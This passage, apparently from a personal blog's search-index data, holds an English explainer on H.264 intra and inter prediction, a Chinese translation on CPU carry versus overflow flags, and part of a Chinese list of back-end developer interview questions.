gain! (*/ω＼*)\nIntra Prediction # Intra prediction is an important concept in video encoding, where predictions are formed from already encoded frames. In video compression, three types of frames are typically used: I-frames, P-frames, and B-frames. I-frames are key frames that use only intra prediction. P-frames and B-frames may use either intra prediction or inter prediction depending on the situation.\nIntra prediction is the process of forming predictions from the encoded parts of the current frame. This can be viewed as a precise form of self-encoding. First, the type of frame needs to be determined. If it is an I-frame, it uses only intra prediction. If it is a P-frame or B-frame, it will choose a prediction method for each macroblock based on the costs of intra and inter prediction. This process encodes data for a frame (or less than a full frame). The data referenced during encoding is this frame, meaning that decoding only requires this frame\u0026rsquo;s data. This encoding method is also used in image encoding; for example, the encoding method for webp images is extremely similar to H.264\u0026rsquo;s intra encoding method.\nThe prediction process works as follows: first, the original data is subtracted from the predicted value to obtain the residual data. Then, the residual data undergoes discrete cosine transform (DCT) and quantization. During the encoding phase, a zigzag scan is performed, and predictions are used to reduce the size of some header information. The results of the DCT and quantization are also subjected to inverse calculations. Finally, the predicted value and the result of the inverse calculation are added together, completing the precise self-encoding.\nIntra prediction uses limited data for the next intra prediction. Before being added to the reference list and used for inter prediction, a loop filter is applied to reduce block effect distortion. This is the basic concept and process of intra prediction.\nThe Significance of Residuals # In video encoding, residual data represents the difference between the original data and the predicted data. This concept comes from predictive models, where the predicted value is often not entirely accurate, resulting in some \u0026ldquo;residuals\u0026rdquo; or errors.\nWhen encoding video frames, we typically attempt to predict the value of each pixel and then calculate the difference between the predicted value and the actual value, which is the residual. The advantage of this approach is that residual data usually contains more zero values than the original pixel data, making it easier to compress and encode.\nFor example, if we predict a pixel\u0026rsquo;s value to be 200, but the actual value is 205, the residual is 5. When encoding this residual value, we only need to store this small difference instead of the complete pixel value. This significantly reduces the amount of information that needs to be stored, achieving data compression.\nIn video encoding, we often further process the residual data, such as applying discrete cosine transform (DCT) and quantization, before encoding. These steps are all aimed at further compressing the data, reducing the required storage space and bandwidth. Below are the original image and a visual representation of the image after calculating the residuals.\nSo why do residuals occur? It is due to inaccuracies in prediction. Let\u0026rsquo;s take a look at how predictions are actually made.\nPrediction Modes # In H.264, images are represented using YUV, where \u0026ldquo;Y\u0026rdquo; represents luminance, and \u0026ldquo;U\u0026rdquo; and \u0026ldquo;V\u0026rdquo; represent chrominance, which is different from the typical RGB and HSV formats.\nIn intra prediction mode, the prediction block P is generated based on previously encoded and reconstructed blocks and is subtracted from the current block before encoding it. For luminance samples, each 4×4 block or 16×16 macroblock forms a prediction block P. Each 4×4 luminance block has nine selectable prediction modes, while each 16×16 luminance block has four modes, and the chrominance components also have four modes. The encoder typically selects the prediction mode that minimizes the difference between the prediction block P and the block to be encoded.\nThere is also a special encoding mode called I PCM, which is a unique intra encoding mode that allows the encoder to directly transmit the values of image samples without the need for prediction or transformation. In certain special cases (such as unusual image content and/or very low quantization parameters), this mode can be more efficient than the usual processes of intra prediction, transformation, quantization, and entropy coding. Including the I PCM option allows for absolute limits on the number of bits that may be contained in the encoded macroblocks without compromising the quality of the decoded image.\nLuminance # For luminance, there are 9 prediction modes:\nWe can consider that for a macroblock, the luminance can fit into one of the above 9 modes based on the pixels to the left and above it. The images clearly show that almost every block fits one of these 9 modes. However, the drawback is that this prediction can lead to distortion. We can observe the differences between the actual image and the predicted image:\nOriginal Image\nPredicted Image\nThe differences between the two are quite evident, which necessitates storing residual information to compensate for the discrepancies with the actual image.\nFor larger blocks, larger prediction methods such as 8x8 or 16x16 can be used, and in practice, the results are not significantly different. Generally, H.264/AVC supports prediction on 16x16 and 4x4 blocks. These two prediction modes are referred to as macroblock prediction (16x16) and subblock prediction (4x4).\nHowever, H.264/AVC also supports 8x8 transforms. This is an optional feature that can be used as an alternative to the default 4x4 transform. In certain cases, using the 8x8 transform can provide better encoding efficiency. For macroblock prediction, there are only 4 modes, while the 8x8 transform, being an alternative to subblock prediction, has 9 modes.\nRed indicates 16x16, purple indicates 8x8, and blue indicates 4x4.\nThe 4 modes for 16x16.\nChrominance # For chrominance, there are 4 modes, and the situation is similar to the 16x16 modes for luminance, so the images are the same.\nIn H.264/AVC encoding, chrominance prediction is typically performed on 8x8 blocks. This is because, in many cases, the sampling rate of the chrominance signal is lower than that of the luminance signal, a phenomenon known as chroma subsampling. For example, in the common 4:2:0 subsampling mode, every four luminance samples correspond to one chrominance sample. Therefore, a 16x16 luminance block corresponds to an 8x8 chrominance block.\nIn stream analysis software, the 16x16 chrominance block is actually a visual representation of the original video. In the 4:2:0 chroma subsampling mode, a 16x16 luminance macroblock corresponds to an 8x8 chrominance block. However, for visualization purposes in stream analysis software, these 8x8 chrominance blocks may be enlarged to 16x16 to match the size of the luminance macroblocks. This is done for easier display and comparison of luminance and chrominance data. This is merely a visualization method; the actual chrominance data is still predicted and encoded in 8x8 blocks. This is because, in the 4:2:0 chroma subsampling mode, the resolution of the chrominance signal is half that of the luminance signal.\nSwitching to chrominance mode, we can clearly see the 8x8 patterns.\nAs for which mode the encoder should choose, this is determined based on the SAE.\nSAE # SAE stands for \u0026ldquo;Sum of Absolute Errors.\u0026rdquo; It is a common error measurement used to evaluate the effectiveness of prediction or encoding operations.\nIn video encoding, we typically need to predict the original video data to reduce the amount of data that needs to be encoded and transmitted. For example, we might predict the pixel values of a block and then only encode the difference between the predicted values and the actual values (known as prediction error or residuals). This significantly reduces the amount of data that needs to be encoded, thereby improving encoding efficiency.\nSAE is a metric used to assess the effectiveness of this prediction. It is the sum of the absolute values of the prediction errors. If the SAE value is small, it indicates that the prediction is effective, as the prediction error is small. Conversely, if the SAE value is large, it indicates that the prediction is less effective.\nThe SAE of 8 is the lowest, so the encoder will choose 8.\nThe specific calculations are not particularly important; they can be quite complex and are not necessary for someone who is not involved in encoder development.\nInter Prediction # Inter prediction is a method that utilizes the temporal correlation between video frames to reduce redundancy. In this approach, the encoder creates a prediction model from one or more previously encoded frames (or fields) and then uses this model to predict the content of the current frame. The difference between the predicted result and the actual content (known as prediction error or residual) will be encoded and transmitted.\nInter prediction primarily relies on motion compensation. Motion compensation is a method for estimating and compensating for motion between video frames. In this method, the encoder finds a motion vector for each block or sub-block, which indicates the corresponding position of that block in the previous frame. The encoder then uses the content from that position to predict the content of the current block.\nTree Structure Motion Compensation # Tree structure motion compensation is a flexible method of motion compensation. In this approach, each macroblock (16x16 luminance samples) can be split in various ways, such as one 16x16 macroblock, two 16x8 blocks, two 8x16 blocks, or four 8x8 blocks. If the 8x8 mode is chosen, each 8x8 sub-macroblock can be further split into one 8x8 sub-macroblock, two 8x4 sub-macroblocks, two 4x8 sub-macroblocks, or four 4x4 sub-macroblocks. This splitting method provides a large number of combination possibilities for each macroblock.\nEach split or sub-macroblock requires a separate motion vector. This motion vector must be encoded and transmitted, and the choice of split must also be encoded into the compressed bitstream. Therefore, the choice of split size has a significant impact on compression performance. Generally, for uniform areas of a frame, a larger split size is more appropriate, while for detailed areas, a smaller split size may be more beneficial.\nThe resolution of the chrominance components (Cb and Cr) in a macroblock is half that of the luminance component. The splitting method for each chrominance block is the same as for the luminance component, but the horizontal and vertical resolutions of the split sizes are exactly half that of the luminance component. For example, an 8x16 luminance split corresponds to a 4x8 chrominance split; an 8x4 luminance split corresponds to a 4x2 chrominance split, and so on. The horizontal and vertical components of each motion vector are halved when applied to the chrominance blocks, as previously mentioned.\nIn the actual encoding process, the encoder will choose the optimal split size. For example, in areas of the frame with little variation (where the residual appears gray), a 16x16 split may be chosen; whereas in areas with significant motion (where the residual appears black or white), smaller splits may be more effective.\nMotion Compensation Interpolation # In motion compensation, we need to find a region of the same size as the current block from the reference frame for prediction. The position of this region is determined by the motion vector, which has a quarter-pixel precision for the luminance component and an eighth-pixel precision for the chrominance component. However, such precision samples do not exist in the reference frame, so interpolation is required to generate these samples. In simple terms, motion compensation is achieved through motion vectors, which describe the positional offset between the region in the reference frame and the current block. However, this offset may be a fraction, meaning that the block we need to predict may lie between the pixels of the reference frame. In this case, we need to use interpolation methods to generate these non-existent pixels.\nThe interpolation process is as follows:\nFirst, generate half-pixel samples located between integer position samples in the luminance component. These samples are obtained through interpolation using a finite impulse response (FIR) filter with weights of (1/32, -5/32, 5/8, 5/8, -5/32, 1/32). For example, the half-pixel sample b is calculated from the six horizontal integer samples E, F, G, H, I, and J. Once all half-pixel samples adjacent to the integer samples are calculated, the remaining half-pixel position samples can be generated through interpolation. After all half-pixel samples are generated, quarter-pixel position samples can be created through linear interpolation. For the chrominance component, since the sampling rate is 4:2:0, it is necessary to generate interpolation samples at eighth-pixel intervals. These samples are obtained through linear interpolation, where each sub-sample position \\( a \\) is a linear combination of the four adjacent integer sample positions \\( A, B, C, \\) and \\( D \\). Motion Vector Calculation # In video encoding, the primary role of the motion vector (MV) is to perform motion compensation prediction. This is a technique that utilizes the temporal correlation between frames in a video sequence to reduce redundancy.\nSpecifically, when encoding a macroblock (MB) or partition in a frame, we can find a similar macroblock or partition in a previous or subsequent frame as a reference, and then calculate the motion vector between these two macroblocks or partitions. This motion vector indicates the positional movement of the current macroblock or partition relative to the reference macroblock or partition.\nIn video encoding, encoding a motion vector for each partition can consume a significant number of bits, especially when smaller partition sizes are chosen. Since the motion vectors of adjacent partitions are often highly correlated, each motion vector is predicted based on the vectors of nearby encoded partitions. First, a predicted vector \\( MV_p \\) is formed based on previously calculated motion vectors, and then the difference between the current vector and the predicted vector (Motion Vector Difference, MVD) is encoded and transmitted.\nThe formation of the predicted vector \\( MV_p \\) depends on the size of the motion compensation partition and the availability of nearby vectors. Let’s assume \\( E \\) is the current macroblock, macroblock partition, or sub-macroblock partition; \\( A \\) is the partition or sub-partition to the left of \\( E \\); \\( B \\) is the partition or sub-partition above \\( E \\); and \\( C \\) is the partition or sub-macroblock partition to the upper right of \\( E \\). If there are multiple partitions to the left of \\( E \\), the topmost one is chosen as \\( A \\). If there are multiple partitions above \\( E \\), the leftmost one is chosen as \\( B \\).\nThe rules for predicting and encoding motion vectors are as follows:\nFor all transmission partitions except for 16×8 and 8×16 partition sizes, the predicted vector \\( MV_p \\) is the median of the motion vectors of partitions \\( A, B, \\) and \\( C \\).\nFor a 16×8 partition, the predicted vector \\( MV_p \\) for the upper 16×8 partition is based on \\( B \\), while the predicted vector \\( MV_p \\) for the lower 16×8 partition is based on \\( A \\).\nFor an 8×16 partition, the predicted vector \\( MV_p \\) for the left 8×16 partition is based on \\( A \\), while the predicted vector \\( MV_p \\) for the right 8×16 partition is based on \\( C \\).\nFor skipped macroblocks, a 16×16 predicted vector \\( MV_p \\) is generated, similar to the case described in point 1 (i.e., as if the block were encoded in 16×16 Inter mode).\nIf one or more previously transmitted blocks shown in Figure 6.19 are unavailable (for example, if they are outside the current slice), the selection of the predicted vector \\( MV_p \\) is modified accordingly. In the decoder, the predicted vector \\( MV_p \\) is formed in the same way and added to the decoded vector difference \\( MVD \\). In the case of skipped macroblocks, where there is no decoded vector difference, the predicted vector \\( MV_p \\) is used as the motion vector to generate the motion-compensated macroblock.\n“2,6” represents the motion vector, indicating the relative position of a macroblock in the reference frame. For example, “2,6” means that this macroblock has moved 2 pixels to the right and 6 pixels down relative to the reference frame.\nThe \u0026ldquo;=\u0026gt;\u0026rdquo; followed by \u0026ldquo;0\u0026rdquo; indicates the index of the reference frame. In this example, the reference frame index is 0, meaning that the reference frame is the previous frame of the current frame.\nIn video encoding, to save bits, we typically do not directly encode the motion vector but instead encode the difference between the motion vector and the predicted vector (MVD). Since the motion vectors of adjacent macroblocks are usually highly correlated, this difference is often small, requiring fewer bits.\nThe motion vector is used for motion compensation prediction, representing the relative positional movement of a macroblock or partition in the reference frame. However, even if the motion vector is completely accurate, it does not guarantee that all pixels will match perfectly. This is because, in a video sequence, in addition to object motion, there may also be changes in lighting, variations in object shape, and other factors that can lead to discrepancies, resulting in some pixel errors even when motion compensation prediction is entirely accurate.\nThese errors need to be corrected through the prediction error (residual). The prediction error is the difference between the original macroblock and the motion-compensated predicted macroblock, reflecting the parts that motion compensation prediction cannot account for. The prediction error must undergo transform coding and is then sent along with the motion vector to facilitate decoding and reconstruction at the decoder end.\nReferences: The content of this article primarily references the H.264/AVC standard documentation and other related materials, such as \u0026ldquo;H.264 and MPEG-4 Video Compression Video Coding for Next Generation Multimedia.\u0026rdquo; The program used in this article is VQ Analyser. gaowanliang/web-video-thumbnailer For a web video that can be downloaded in segments, it is possible to create an overview of the video by downloading only a small amount of binary data. Python 34 4 ","date":"29 March 2024","externalUrl":null,"permalink":"/en/posts/intra-prediction-and-inter-prediction/","section":"","summary":"\u003cp\u003ePreviously, we discussed some aspects of H.264 encoding in MP4. This time, let\u0026rsquo;s delve into how H.264 achieves such high compression rates, which brings us to the concepts of intra prediction and inter prediction. After some research, I found that there might not be any other source as detailed as this one, and it contains almost no complex or difficult information—reading this is a gain! (*/ω＼*)\u003c/p\u003e","title":"A Brief Overview of H.264 Frame Encoding Principles - Intra Prediction and Inter Prediction","type":"posts"},{"content":"","date":"29 March 2024","externalUrl":null,"permalink":"/en/tags/h264/","section":"Tags","summary":"","title":"H264","type":"tags"},{"content":"","date":"29 March 2024","externalUrl":null,"permalink":"/en/tags/inter-prediction/","section":"Tags","summary":"","title":"Inter Prediction","type":"tags"},{"content":"","date":"29 March 2024","externalUrl":null,"permalink":"/en/tags/intra-prediction/","section":"Tags","summary":"","title":"Intra Prediction","type":"tags"},{"content":"","date":"29 March 2024","externalUrl":null,"permalink":"/en/tags/video-encoding/","section":"Tags","summary":"","title":"Video Encoding","type":"tags"},{"content":"","date":"2024年3月29日","externalUrl":null,"permalink":"/tags/%E5%B8%A7%E5%86%85%E7%BC%96%E7%A0%81/","section":"Tags","summary":"","title":"帧内编码","type":"tags"},{"content":"","date":"2024年3月29日","externalUrl":null,"permalink":"/tags/%E5%B8%A7%E9%97%B4%E7%BC%96%E7%A0%81/","section":"Tags","summary":"","title":"帧间编码","type":"tags"},{"content":"","date":"2024年3月29日","externalUrl":null,"permalink":"/tags/%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81/","section":"Tags","summary":"","title":"视频编码","type":"tags"},{"content":"","date":"2023年5月25日","externalUrl":null,"permalink":"/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/","section":"Tags","summary":"","title":"二进制","type":"tags"},{"content":" 注意： 本文为翻译文章，原文链接为 Ian! D. Allen. 作者为 Ian! D. Allen。 在整数算术中，不要把“进位”标志和“溢出”标志混淆。每个标志都可以单独出现，也可以同时出现。CPU 的 ALU 不关心或不知道你是在做有符号还是无符号的数学运算；ALU 总是在做任何整数运算时适当地设置两个标志。ALU 不知道有符号/无符号；ALU 只是做二进制运算并适当地设置标志。你，作为程序员，必须知道在运算完成后检查哪个标志。\n如果你的程序把一个字中的位当作无符号数，你必须注意看你的算术是否把进位标志置为 1，表示结果是错误的。在做无符号数学运算时，你不关心溢出标志。（溢出标志只与有符号数有关，与无符号数无关。）\n如果你的程序把一个字中的位当作二进制补码有符号值，你必须注意看你的算术是否把溢出标志置为 1，表示结果是错误的。在做有符号的二进制补码数学运算时，你不关心进位标志。（进位标志只与无符号数有关，与有符号数无关。）\n在无符号算术中，观察进位标志来检测错误。 在无符号算术中，溢出标志对你没有什么意义。 在有符号算术中，观察溢出标志来检测错误。 在有符号算术中，进位标志对你没有什么意义。\n英语 # 不要把英语动词“to overflow” （溢出）和 ALU 中的“overflow flag” （溢出标志）混淆。动词“to overflow” （溢出）通常用来表示一些数学结果不适合可用的位数；它可以是整数运算、浮点运算或其他任何运算。 “Overflow flag” （溢出标志）是由 ALU 按照下面描述的方式特别设置的，并且它与通俗英语中的动词“to overflow” （溢出）不同。\n在英语中，我们可能会说“二进制/整数运算溢出了结果可用的位数，导致进位标志被打开”。注意这种英语中动词“to overflow” （溢出）的用法不等同于说“溢出标志被打开”。一个数学结果可以溢出（动词）可用的位数而不打开 ALU 的“overflow” （溢出）标志。\n进位标志 # 在二进制/整数运算中打开进位标志的规则有两条：\n如果两个数字相加导致最高有效位（最左边）相加产生了进位，则设置进位标志。\n1111 + 0001 = 0000 (进位标志被打开)\n如果两个数字相减需要从最高有效位（最左边）借位，则也设置进位（借位）标志。\n0000 - 0001 = 1111 (进位标志被打开)\n否则，进位标志被清零。\n0111 + 0001 = 1000 (进位标志被清零) 1000 - 0001 = 0111 (进位标志被清零) 在无符号算术中，观察进位标志来检测错误。\n在有符号算术中，进位标志不会告诉您任何有趣的信息。\n溢出标志 # 二进制/整数运算中，打开溢出标志的规则有两条：\n如果两个没有符号位的数相加，得到一个有符号位的数，那么“溢出”标志就会打开。 0100 + 0100 = 1000 (溢出标志打开) 如果两个有符号位的数相加，得到一个没有符号位的数，那么“溢出”标志就会打开。 1000 + 1000 = 0000 (溢出标志打开) 其他情况下，溢出标志就会关闭。\n0100 + 0001 = 0101 (溢出标志关闭) 0110 + 1001 = 1111 (溢出标志关闭) 1000 + 0001 = 1001 (溢出标志关闭) 1100 + 1100 = 1000 (溢出标志关闭) 注意，你只需要看三个数的符号位（最左边的）来判断溢出标志是打开还是关闭。\n如果你是做二进制补码（有符号）运算，溢出标志打开意味着答案是错误的——你把两个正数相加得到了一个负数，或者你把两个负数相加得到了一个正数。\n如果你是做无符号运算，溢出标志没有意义，应该被忽略。\n二进制补码检测错误的规则是通过检查结果的符号来确定。一个负数和一个正数相加不可能是错的，因为它们的和在两个加数之间。由于两个加数都在允许的范围内，而它们的和在它们之间，所以它也必须在范围内。混合符号的加法永远不会打开溢出标志。\n在有符号运算中，观察溢出标志来检测错误。\n在无符号运算中，溢出标志对你没有什么意义。\nALU 如何计算溢出标志 # 这部分内容是可选阅读的。\n有几种自动检测二进制补码运算中的溢出错误的方法（对于那些不喜欢手动检查方法的人）。这里有两种：\n计算溢出标志：方法一 # 只有当两个同号的数相加得到一个异号的数时，才会发生溢出。所以，要检测溢出我们不关心除了符号位以外的任何位。忽略其他位。\n有两个操作数和一个结果，我们有三个符号位（每个是 1 或 0）要考虑，所以我们有 8 种可能的三位组合。只有其中两种情况被认为是溢出。\n下面只是两个加数和结果的符号位：\n加法标志位 num1sign num2sign sumsign --------------------------- 0 0 0 *OVER* 0 0 1 (两个正数结果相加应该是正的) 0 1 0 0 1 1 1 0 0 1 0 1 *OVER* 1 1 0 (两个正数结果相加应该是正的) 1 1 1 我们可以重复同样的表格来表示减法。注意，减去一个正数和加上一个负数是一样的，所以触发溢出标志的条件是：\n减法标志位 num1sign num2sign sumsign --------------------------- 0 0 0 0 0 1 0 1 0 *OVER* 0 1 1 (减去一个负数等于加上一个正数) *OVER* 1 0 0 (减去一个负数等于加上一个正数) 1 0 1 1 1 0 1 1 1 一台计算机可能包含一个小的逻辑门阵列，当满足上述四种溢出条件中的任何一种时，将溢出标志设置为“1” 。\n人类只需要记住，当做有符号运算时，两个同号的数相加必须得到同号的结果，否则就发生了溢出。\n计算溢出标志：方法二 # 当两个二进制值相加时，考虑进入最左边一位（进入符号位）的二进制进位和从最左边一位（符号位）出去的二进制进位。（从最左边的[符号]位出去的进位成为 ALU 中的进位标志。）\n在二进制补码中，溢出可能发生在不是从最左列进位，而是当有一个进入它而没有匹配的出去时。也就是说，当有一个进入符号位但没有从符号位出去时，就会发生溢出。\n溢出标志是进入符号位（如果有）的进位与从符号位（如果有）出去的进位的异或。如果进入不等于出去，就会发生溢出。\n例子（2 位有符号二进制补码数字）：\n11 + 01 === 00 进入是 1 出去是 1 1 XOR 1 = 没有溢出 01 + 01 === 10 进入是 1 出去是 0 1 XOR 0 = 溢出！ 11 + 10 === 01 进入是 0 出去是 1 0 XOR 1 = 溢出！ 10 + 10 === 11 进入是 0 出去是 0 0 XOR 0 = 没有溢出 注意，这种异或方法只适用于二进制进入符号位的进位。如果你使用十六进制数字、十进制数字或八进制数字，你也会有进位；但是，这种非二进制的进位不会影响符号位，你不能用这种非二进制的进位和出去的进位进行异或。\n十六进制加法例子（显示异或对十六进制进位不起作用）：\n8Ah + 8Ah ==== 14h 由于 A+A 产生的十六进制进位为 1，它不会影响符号位。如果你用二进制做运算，你会看到没有任何进入符号位的进位；但是，有从符号位出去的进位。因此，上面的例子会使溢出标志打开。（这个例子把两个负数相加得到了一个正数。）\n","date":"2023年5月25日","externalUrl":null,"permalink":"/posts/er-jin-zhi-suan-fa-zhong-de-jin-wei-he-yi-chu/","section":"","summary":"本文讨论了在二进制算法中的进位(CARRY)标志和溢出(OVERFLOW)标志的区别","title":"二进制算法中的进位(CARRY)标志和溢出(OVERFLOW)标志","type":"posts"},{"content":"","date":"2023年5月25日","externalUrl":null,"permalink":"/tags/%E7%AE%97%E6%B3%95/","section":"Tags","summary":"","title":"算法","type":"tags"},{"content":"https://github.com/arialdomartini/Back-End-Developer-Interview-Questions\n通用问题 开放式问题 设计模式相关问题 代码设计相关问题 语言相关问题 Web 相关问题 数据库相关问题 非关系型数据库相关问题 代码版本管理相关问题 并发问题 分布式系统相关问题 软件生命周期和团队管理相关问题 逻辑和算法相关问题 软件架构相关问题 面向服务架构(SOA)和微服务(Microservice)相关问题 安全相关问题 比尔盖茨式问题 代码示例问题 通用问题: # 语言设计中空引用(null reference)的存在有什么问题？假设你想要将空引用的概念从你的首选语言中移除，可能导致什么结果？ 为什么函数式编程重要？什么时候适用函数式语言？ 设计(design)、架构(architecture)、功能(functionality)和美学(aesthetic)之间有什么区别？讨论一下。 微软、谷歌、欧朋(opera)和火狐这类公司是如何从他们的浏览器中获利的？ 为什么打开 TCP 套接字有很大的开销？ 封装的重要性体现在哪儿？ 什么是实时系统？它与普通系统有什么区别？ 实时语言(real-time language)和堆内存分配(heap memory allocation)之间的关系是什么？ 不变性(Immutability)是指: (变量的)值只能在创建的时候被设置一次，之后就不能被改变。为什么不变性对写更加安全的代码有帮助？ 可变值(mutable values)和不可变值(immutable values)有哪些优缺点？ 什么是 O/R 阻抗失衡(Object-Relational impedence mismatch)？ 如果你需要使用缓存，你使用哪些原则来确定缓存的大小？ TCP 和 HTTP 有什么区别？ 在客户端渲染(client-side rendering)和服务端渲染(server-side rendering)之间，你是如何权衡的？ 如何在一个不可靠的协议之上构建一个可靠的通信协议？ 开放式问题: # 为什么人们会抵制变化？ 如何向你的祖母解释什么是线程？ 作为一个软件工程师，你想要既要有创新力，又要产出具有可预测性。采用什么策略才能使这两个目标可以共存呢？ 什么是好的代码？ 解释什么是流(Streaming)和如何实现一个流？ 假设你的公司给你一周的时间，用来改善你和同事的生活: 你将如何使用这一周？ 本周你学了什么？ 所有的设计中都会有美学元素(aesthetic element)的存在。问题是，你认为美学元素是你的朋友还是敌人？ 列出最近你读过的 5 本书。 假设目前有个大型公司（非常有钱），他们的开发流程是瀑布式流程（Waterfall），如果需要你在他们公司引入持续交付（Continue Devivery），你会怎么做？ 我们来谈谈\u0026quot;重复造轮子\u0026quot;,\u0026ldquo;非我发明症\u0026rdquo;, \u0026ldquo;吃自己做出来的狗粮\u0026quot;的这些做法吧。 (注: 重复造轮子: Reinventing the wheel; 非我发明症:Not Invented Here Syndrome; 吃自己做出来的狗粮: Eating Your Own Dog Food) 在你当前的工作流中，什么事情是你计划下一步需要自动化的？ 为什么写软件是困难的？是什么使软件的维护变得困难？ 你更喜欢在全新项目（Green Field Project）上工作还是在已有项目(Brown Field Project)基础上工作？为什么？ 当你在浏览器地址栏输入 google.com 回车之后都发生了什么? 当操作系统 CPU 处于空闲的时候，它可能在处理哪些事情？ 如何向一个 5 岁的孩子解释什么是 Unicode/数据库事务？ 如何维护单体架构(monolithic architecture)？ 一个\u0026quot;专业的开发者\u0026quot;意味着什么？ 软件开发是艺术、是技艺还是工程？你的观点是什么？ \u0026ldquo;喜欢这个的人也喜欢\u0026hellip;\u0026quot;，如何在一个电子商务商店里实现这种功能？ 为什么在创新上，企业会比创业公司慢些？ 为什么说，你不应该尝试应用自己发明或者设计的密码学？ 设计模式相关问题: # 请用一个例子表明，全局对象是邪恶的存在。\n假设你工作的系统不支持事务性，你会如何从头开始实现它？\n什么是好莱坞原则（Hollywood Principles）？\n关于迪米特法则(最少知识原则): 写一段代码违反它, 然后修复它。 （注: 迪米特法则：the Law of Demeter, 最少知识原则： the Principle of Least Knowledge）\nActive-Record 模式有什么限制和缺陷？\nData-Mapper 模式和 Active-Record 模式有什么区别？\n空对象模式(Null Object Pattern)的目的是什么？\n为什么组合(Composition)比继承(Inheritance)更好？\n什么是反腐败层(Anti-corruption Layer)?\n你可以写一个线程安全的单例(Singleton)类吗？\n数据抽象(Data Abstraction)能力是指能改变实现而不影响客户端的这种能力。请构造一个一个例子，违反这个特性，并且尝试修复它。\n你是如何处理依赖关系地狱(Dependency Hell)的？\n为什么说 goto 语句是恶魔般的存在？\n健壮性是进行软件设计时的一个通用原则，它建议 “发送时要保守，接收时要开放”。这也经常被写成，“做一个有耐心的读者，做一个谨慎的作者”。你能解释一些这背后的逻辑吗？\n译者注： \u0026ldquo;发送时要保守，接收时要开发\u0026quot;的原文是： \u0026ldquo;Be conservative in what you send, be liberal in what you accept\u0026rdquo;，有点类似于“严于律己，宽于待人”的意味。\n代码设计相关问题: # 你在进行软件设计时会考虑软件测试吗？软件测试是如何影响软件设计的？ 内聚和耦合的区别是什么？ 重构在哪些场景下有用？ 代码中的注释有用吗？ 设计和架构有什么区别？ 为什么在测试驱动开发(TDD)中是先写测试，再写代码？ C++支持多继承，Java 允许类实现多个接口。这些特性对正交性有什么影响？使用多继承和使用多接口有区别吗？[这个问题来自 Andrew .Hunt 和 David Thomas 写的《程序员修炼之道》] 在存储过程（Stored Procedures）中写业务逻辑有什么优缺点？ 语言相关问题: # 告诉我你的首选语言的三个最坏的缺陷。 为什么现在函数式编程这么越来越受关注？ 闭包是什么？它有什么用途？闭包和类有什么共同点？ 泛型有什么用途？ 什么是高阶函数？有什么用途？用你的首选语言写个例子出来。 讨论一下，如何写一个循环，然后把它转换成递归函数，要避免易变性。 有些语言将函数视为第一公民，这是什么意思？ 用一个例子说明匿名函数是有用的。 什么是动态方法调度(Dynamic Method Dispatch)？ 名字空间(Namespace)有什么用？有什么可以替代它的吗？ 谈谈 Java 和 C#之间的互操作性(Interoperability) (任选其他两门语言都行) 为什么很多软件工程师不喜欢 Java？ 你认为好的语言好在哪里？差的语言差在哪里？ 写两个函数，一个是\u0026quot;引用透明的(Referentially Transparent)\u0026quot;，另一个是\u0026quot;引用不透明的(Referentially Opaque)\u0026quot;。讨论之。 什么是栈？什么是堆？ 为什么一个语言中，\u0026ldquo;函数是第一公民\u0026quot;是很重要的？ 模式匹配(Pattern Matching)和 Switch 语句(Switch clauses)的区别在哪儿？ 为什么有些语言设计上没有异常机制？这有什么优缺点？ 如果Cat是一个Animal, 那么TaskCare\u0026lt;Cat\u0026gt;是一个TakeCare\u0026lt;Animal\u0026gt;吗？ web 相关问题: # 为什么\u0026quot;第一方 cookie(first-party cookie)\u0026ldquo;和\u0026quot;第三方 cookie(third-party cookie)\u0026ldquo;被如此不同的对待？ 数据库相关问题: # 如果要你将一个项目从 MySQL 迁移至 PostgreSQL 中，你会如何迁移？ 为什么 SELECT * FROM table WHERE field = null 不能匹配空的字段？ 什么是 ACID(原子性，一致性，隔离性，持久性)原则？ 你是如何进行数据库模式(Database schema)迁移的？ 延迟加载(lazy loading)是如何实现的？什么场景下有用？他有什么缺陷？ 什么是 N+1 问题？ 如何找出应用中开销最大的查询？ 非关系型数据库相关问题: # 什么是最终一致性(Eventual Consistency)？ 关于 CAP 理论，举一些 CP、AP、CA 系统的例子。 NoSQL 是如何解决可伸缩性的挑战的？ 什么情况下你会使用类似于 MongoDB 的文档数据库而不是关系型数据库（如 Mysql 或者 PostgreSQL）？ 代码版本管理相关问题: # 为什么在 Mercurial 或者 git 中(管理)分支比 SVN 容易？\n分散式版本控制系统（比如 git），相比集中式版本控制系统（如 svn）有哪些优势和劣势？ (注:集中式版本控制系统: Centralized Version Control Systems；分散式版本控制系统: Distributed Version Control Systems)\n能描述一下什么是 GitHubFlow 和 GitFlow 工作流吗？\n什么是 rebase？\n为什么合并操作(merge)在 Mercurial 和 git 中比在 SVN 和 CVS 中容易？\n并发问题: # 为什么我们需要并发呢？解释一下。 为什么测试多线程/并发代码这么困难？ 什么是竞争条件（Race Condition）？用任何一个语言写一个例子。 什么是死锁？用代码解释一下。 什么是饿死？ 什么是 Wait-Free 算法？ 分布式系统相关问题: # 怎么测试一个分布式系统？ 什么场景下你会在两个系统中采用异步通信机制？ 远程过程调用的通用缺点是什么？ 如果你为了可扩展性和鲁棒性而构建一个分布式的系统，分别在封闭安全的网络环境情况下，和地理上的位置不同但是网络环境不是封闭和安全的情况下，你会考虑什么不同的事情？ 在 Web 应用中如何管理容错性？在桌面端呢？ 在分布式系统中，如何处理故障？ 让我们来谈谈网络分裂(network partitions)后有的几种恢复的手段吧。 你认为分布式计算中有哪些谬论？ 你在什么时候会使用 Request/Response 模式，什么时候使用 Publish/Subscribe 模式？ 软件生命周期和团队管理相关问题: # 什么是敏捷（Agility）？ 你是如何处理遗留代码（Legacy Code）的？ 假设我是你们公司的 CEO，请向我解释什么是看板，并且说服我在它上面投资。 敏捷（Agility）和瀑布（Waterfall）之间的最大区别是什么？ 作为团队管理者，你对会议太多这个问题是如何处理的？ 你会如何处理延期很长时间了的项目？ \u0026ldquo;个体与交互重于过程和工具\u0026quot;和\u0026quot;客户协作重于合同谈判\u0026quot;占了敏捷宣言（Agile Manifesto）的一半，谈论一下这两个观念。 如果你是你们公司的 CTO，你会采取什么样的决策？ 你觉得项目经理有用吗？ 如果要你组织一个弹性工作制的开发团队（即没有强制工作时间的要求），并且假期制度是\u0026quot;按需休假\u0026rdquo;，你会如何做？ 你会如何管理一个人员流动非常高的团队？如何在不加薪的条件下说服团队成员不要离开？ 除了代码之外，你最关注你的同事的哪 3 项素质？ 关于代码，你最希望非技术人员能知道的的三件事是什么？ 逻辑和算法相关问题: 